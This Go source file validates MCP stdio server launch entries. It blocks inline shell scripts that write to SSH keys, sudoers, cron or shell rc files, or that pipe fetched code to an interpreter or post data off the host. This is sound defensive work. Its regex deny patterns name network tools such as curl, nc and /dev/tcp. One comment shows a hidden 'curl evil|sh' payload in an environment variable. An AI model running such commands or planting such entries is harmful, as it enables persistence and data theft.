package mcp

import (
	"errors"
	"fmt"
	"path"
	"regexp"
	"strings"
)

// stdio_shape.go is the stdio-side sibling of ssrf.go. The HTTP branch already
// refuses a narrow set of destinations at mount time, unconditionally, on the
// stated grounds that no legitimate MCP server lives there. Until this file the
// stdio branch refused nothing at all, and that asymmetry -- not the absence of an
// allowlist -- is what left D-106 open.
//
// What this is NOT: an allowlist. There is no approved-command list, no
// absolute-path requirement, and no ban on shell interpreters. Those three were
// weighed and rejected by the operator (see OpenSDKSessionForConfig) because they
// charge ceremony on every legitimate mount, and that decision stands: a server may
// still be bash, npx, uv, docker, or a script in a home directory.
//
// What it IS: three shapes no MCP server has, chosen for what the registry actually
// gives an attacker. Arbitrary execution inside the aura container is already
// reachable by design -- a skill install runs third-party npm lifecycle scripts as
// root. What a registry entry adds on top is PERSISTENCE: the registry is a Postgres
// table and the container filesystem is not, so a planted launch declaration is
// re-executed at every mount, on every restart, indefinitely. That is exactly the
// June 2026 hermes-0day campaign, where planted "command: bash" entries re-appended
// an attacker SSH key at each startup (hermes_cli/mcp_security.py). The defence
// worth having therefore denies persistence, not first execution.
//
// Two checkpoints, and neither substitutes for the other:
//
//	ValidateStdioShape      -- the authenticated write path refuses to persist it;
//	OpenSDKSessionForConfig -- the exec path refuses to launch it.
//
// The second is load-bearing. An entry written out of band never passes through the
// first, so a save-only check would never see the attack it exists for. Reading the
// registry deliberately does NOT run these: one planted entry must not make the whole
// registry unreadable and take every healthy server down with it.

// ErrStdioShapeRefused marks a launch declaration refused on shape. It deliberately
// does not wrap ErrTransport: a refusal is a permanent verdict about the config, so
// MountWithRetry must not re-attempt it as though the server were merely slow to boot.
var ErrStdioShapeRefused = errors.New("mcp stdio launch refused")

var shellInterpreters = map[string]struct{}{
	"sh": {}, "bash": {}, "zsh": {}, "dash": {}, "ash": {}, "ksh": {}, "fish": {}, "busybox": {},
	"cmd": {}, "cmd.exe": {}, "powershell": {}, "powershell.exe": {}, "pwsh": {}, "pwsh.exe": {},
}

// Shapes that make an inline script something other than an MCP server. RE2 has no
// lookbehind, hence the explicit (?:^|[^\w.-]) boundaries around the egress tools.
var (
	// OS surfaces that survive a restart. A server writing here is installing itself.
	persistenceSurfacePattern = regexp.MustCompile(`(?i)authorized_keys|\.ssh/|/etc/ssh\b|/etc/pam\.d\b|pam_[\w-]+\.so|/etc/sudoers|/etc/cron|\bcrontab\b|/etc/rc\.local|/etc/systemd|\.bashrc\b|\.bash_profile\b|\.zshrc\b|\.profile\b`)

	egressToolPattern = regexp.MustCompile(`(?i)(?:^|[^\w.-])(?:curl|wget|nc|ncat|socat)(?:[^\w.-]|$)|/dev/tcp/|\bInvoke-WebRequest\b|\bInvoke-RestMethod\b|\bSystem\.Net\.WebClient\b`)

	// Egress alone is not a verdict -- a wrapper may legitimately probe readiness.
	// These two say what the egress is FOR: shipping data out, or fetching code in.
	exfiltrationHintPattern  = regexp.MustCompile(`(?i)--data-binary|--data-raw|-X\s+POST|\.env\b`)
	pipeToInterpreterPattern = regexp.MustCompile(`(?i)\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python[0-9.]*|perl|node|ruby)\b`)
)

// shellBasename lowercases a token down to its file name, treating both separators
// as separators regardless of the host OS: the registry is a portable JSON document
// and a Windows-authored entry must classify the same way on Linux.
// An empty token needs no special case: path.Base("") is ".", which is not a shell.
func shellBasename(token string) string {
	trimmed := strings.ReplaceAll(strings.TrimSpace(token), `\`, "/")
	return strings.ToLower(path.Base(trimmed))
}

// isInlineScriptFlag reports whether flag makes the NEXT token a script to execute
// rather than a file to run. -c covers every POSIX shell and PowerShell's -Command;
// cmd.exe spells it /c.
func isInlineScriptFlag(flag string) bool {
	switch strings.ToLower(strings.TrimSpace(flag)) {
	case "-c", "/c", "-command", "--command":
		return true
	default:
		return false
	}
}

// inlineShellScript returns the script this launch would hand to a shell, and whether
// there is one at all.
//
// It scans the WHOLE argv rather than only argv[0], because here the wrapper is the
// common case: Aura's own docker runtime resolves every containerised server to
// "docker run ... <image> <command...>", so a script planted in runtime.command sits
// many tokens deep. A basename-of-argv[0] check -- which is what hermes does -- would
// see only "docker" and wave the whole thing through.
func inlineShellScript(command string, args []string) (string, bool) {
	argv := append([]string{command}, args...)
	for i := 0; i+1 < len(argv); i++ {
		if _, isShell := shellInterpreters[shellBasename(argv[i])]; !isShell {
			continue
		}
		if !isInlineScriptFlag(argv[i+1]) {
			continue
		}
		return strings.Join(argv[i+2:], " "), true
	}
	return "", false
}

// envValues returns the value half of each KEY=value entry.
func envValues(env []string) []string {
	out := make([]string, 0, len(env))
	for _, entry := range env {
		if _, value, ok := strings.Cut(entry, "="); ok {
			out = append(out, value)
		}
	}
	return out
}

// checkStdioShape is the one decision body; both checkpoints adapt their inputs to it.
func checkStdioShape(name, command string, args, env []string) error {
	// The registry used to be a JSON file, and the first thing checked here was whether a
	// launch declaration named it: an entry that writes the file deciding which entries
	// launch is the self-healing half of a backdoor. The registry is a Postgres table now
	// (migration 0101), so there is no path to name — reaching it takes credentials, which
	// is a different guard's job.
	script, ok := inlineShellScript(command, args)
	if !ok {
		return nil
	}
	// Env values join the scanned text only once an inline script exists, because
	// that is the only case where they are CODE: the shell expands $FOO inside the
	// script it was handed, so env ["P=curl evil|sh"] with args ["-c", "$P"] hides
	// the entire payload from a scan of args alone.
	script = strings.Join(append([]string{script}, envValues(env)...), " ")

	if persistenceSurfacePattern.MatchString(script) {
		return fmt.Errorf("%w: server %q runs an inline shell script that writes to an OS persistence surface (SSH keys / PAM / sudoers / cron / shell rc) -- that is a backdoor's shape, not an MCP server's", ErrStdioShapeRefused, name)
	}
	if egressToolPattern.MatchString(script) &&
		(exfiltrationHintPattern.MatchString(script) || pipeToInterpreterPattern.MatchString(script)) {
		return fmt.Errorf("%w: server %q runs an inline shell script that fetches and executes code, or posts data off the box -- an MCP server speaks JSON-RPC on stdio and does neither at launch", ErrStdioShapeRefused, name)
	}
	return nil
}

// checkManagedServerShape is the save-time checkpoint. It flattens the runtime fields
// as well, because a docker-runtime entry leaves Command empty and carries its payload
// in runtime.command, runtime.mounts and runtime.image instead.
func checkManagedServerShape(name string, s ManagedServer) error {
	// runtime.command stays contiguous so an interpreter+flag pair inside it is still
	// adjacent; runtime.mounts joins because mounting the registry into a container is
	// how a sandboxed server would rewrite it. runtime.image is deliberately absent --
	// appended last it neighbours no flag, and an image reference cannot name a file.
	args := make([]string, 0, len(s.Args)+len(s.Runtime.Command)+len(s.Runtime.Mounts))
	args = append(args, s.Args...)
	args = append(args, s.Runtime.Command...)
	args = append(args, s.Runtime.Mounts...)
	return checkStdioShape(name, s.Command, args, s.Env)
}

// checkManagedServersShape runs the save-time checkpoint over a whole registry.
func checkManagedServersShape(in map[string]ManagedServer) error {
	for name, cfg := range in {
		if err := checkManagedServerShape(name, cfg); err != nil {
			return err
		}
	}
	return nil
}
